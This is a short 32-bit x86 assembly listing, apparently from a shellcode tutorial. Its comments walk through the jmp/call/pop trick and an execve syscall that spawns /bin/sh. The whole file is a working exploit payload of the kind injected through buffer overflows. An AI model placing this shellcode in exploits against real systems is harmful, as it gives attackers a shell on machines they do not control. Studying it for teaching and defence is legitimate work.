BITS 32

jmp short       callit            ; jmp trick as explained above

doit:

pop             esi               ; esi now represents the location of our string
xor             eax, eax          ; make eax 0
mov byte        [esi + 7], al     ; terminate /bin/sh 
lea             ebx, [esi]        ; get the adress of /bin/sh and put it in register ebx 
mov long        [esi + 8], ebx    ; put the value of ebx (the address of /bin/sh) in AAAA ([esi +8]) 
mov long        [esi + 12], eax   ; put NULL in BBBB (remember xor eax, eax) 
mov byte        al, 0x0b          ; Execution time! we use syscall 0x0b which represents execve
mov             ebx, esi          ; argument one... ratatata /bin/sh
lea             ecx, [esi + 8]    ; argument two... ratatata our pointer to /bin/sh
lea             edx, [esi + 12]   ; argument three... ratataa our pointer to NULL
int             0x80

callit:
call            doit              ; part of the jmp trick to get the location of db

db              '/bin/sh#AAAABBBB'
